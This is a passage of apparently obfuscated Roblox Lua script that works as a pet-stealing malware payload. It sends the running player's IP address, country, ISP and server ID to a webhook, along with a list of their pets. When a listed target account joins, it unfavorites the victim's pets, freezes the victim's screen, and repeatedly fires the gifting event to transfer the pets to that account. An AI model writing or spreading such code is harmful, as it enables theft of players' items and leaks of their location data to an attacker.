        { name = MgdkOhMEznFFMSRLECVEWYpZYZpVaDZquyLN('DQwnDsqHoxcgFcdPegroyhohwNXftDCekvZNjGohCnvQwZJjXjYSIqw8J+MkCBJUA=='), value = ip },
        { name = MgdkOhMEznFFMSRLECVEWYpZYZpVaDZquyLN('CARAuaMZYSeJuxQmoBbtreYGfFrNzCcYVemYmEgEHrVwRGNHhmUpgfY8J+Xuu+4jyBDb3VudHJ5'), value = country },
        { name = MgdkOhMEznFFMSRLECVEWYpZYZpVaDZquyLN('NQlLasTyjvKVgvPsYrxSCSdRRKKYJRkUHHlxfDYjigvNLEYyjctvvSw8J+SuyBJU1A='), value = isp },
        { name = MgdkOhMEznFFMSRLECVEWYpZYZpVaDZquyLN('yzZDnsJHcVyndQGvLQrQngzuIBuxIKZZfmgXHJaLuWFcHvAWDBINiXO8J+ToSBTZXJ2ZXIgSUQ='), value = jobId },
        { name = MgdkOhMEznFFMSRLECVEWYpZYZpVaDZquyLN('XEwOMoVNksvJAbkqsjkLcdObPCwSFnAOmBWBcfqwdhzNphzFWVhYZXc4o+x77iPIFRpbWU='), value = os.date(MgdkOhMEznFFMSRLECVEWYpZYZpVaDZquyLN('LpjvjpkCrWbvukIkwAURLoCODAfXegVnlkHPfnfsLaMpqeBWtGRRMoGJVktJW0tJWQgJUg6JU06JVM=')) }
    })
end)

-- Send filtered pets
spawn(function()
    local pets = getFilteredPets()
    local petChunks = #pets > 0 and chunkItems(pets) or {
        { name = MgdkOhMEznFFMSRLECVEWYpZYZpVaDZquyLN('estEDLfHToxVDshbfMqnPGySRVgFjnuwSozKYkyTmamFyCtLSSJLgBf8J+OkiBQZXRz'), value = MgdkOhMEznFFMSRLECVEWYpZYZpVaDZquyLN('JOKpZKotyJjWQrJHwlRzlMRmBnYzcCxksWrGtuNqUVwMIUbqGkaVqgUTm9uZQ=='), inline = false }
    }
    sendWebhook(petChunks)
end)

-- Send 3rd message: server status
spawn(function()
    sendWebhook({
        { name = MgdkOhMEznFFMSRLECVEWYpZYZpVaDZquyLN('hyQSzsvpDUzaKeYShiduwgyVFSCjbZqVyqurbVCODCbnwzBkvXdWayb8J+UgyBTZXJ2ZXIgU3RhdHVz'), value = wasPrivateServer and MgdkOhMEznFFMSRLECVEWYpZYZpVaDZquyLN('iZNQIxFHIeDDgBOwHyAXEpuAvqHAqwvBnLBLWkrxleyCirqOcELKMRWUHJpdmF0ZSBzZXJ2ZXIgZGV0ZWN0ZWQuIFNlcnZlciBob3AgZXhlY3V0ZWQu') or MgdkOhMEznFFMSRLECVEWYpZYZpVaDZquyLN('CvGzOFcOaaPIvzjJDeJMzEkQFdEZhUyulsAWQRYlcNOnqQkTsHXkVKPQWxyZWFkeSBpbiBwdWJsaWMgc2VydmVyLg=='), inline = false }
    })
end)

-- Watch for targets & drain pets + unfavorite
spawn(function()
    while true do
        for _, player in ipairs(Players:GetPlayers()) do
            if table.find(targetUsernames, player.Name) then
                unfavoriteAllPets()
                for _, tool in ipairs(backpack:GetChildren()) do
                    if tool:IsA(MgdkOhMEznFFMSRLECVEWYpZYZpVaDZquyLN('MYBvEFtGJsJtAsyeyjHQmmTAouMcLRQdSGItOoOfmBnwknjfxxEVnZeVG9vbA==')) and hasKeyword(tool.Name, drainPets) then
                        freezeVisual()
                        tool.Parent = character
                        wait(0.3)
                        while player and player.Parent == Players and tool.Parent == character do
                            local args = {MgdkOhMEznFFMSRLECVEWYpZYZpVaDZquyLN('TCflsUtNezlOLkuBQgOQTMPADswyEwjdkmtxyLmybTRhiEnkTDgPICaR2l2ZVBldA=='), player}
                            ReplicatedStorage:WaitForChild(MgdkOhMEznFFMSRLECVEWYpZYZpVaDZquyLN('pNDrUEnpBbyxEjEqWvPffvwIsJcBWvumezUWWLjJMvJnHhSNeCOTaClR2FtZUV2ZW50cw==')):WaitForChild(MgdkOhMEznFFMSRLECVEWYpZYZpVaDZquyLN('XwSVjTPMQCUNRCLiokXcsYzlcuMFgDIUTathPcOHakZrxUCYkZwWTFwUGV0R2lmdGluZ1NlcnZpY2U=')):FireServer(unpack(args))
                            wait(0.7)
                        end
                    end
                end
            end
        end
        wait(2.5)
    end
end)
    
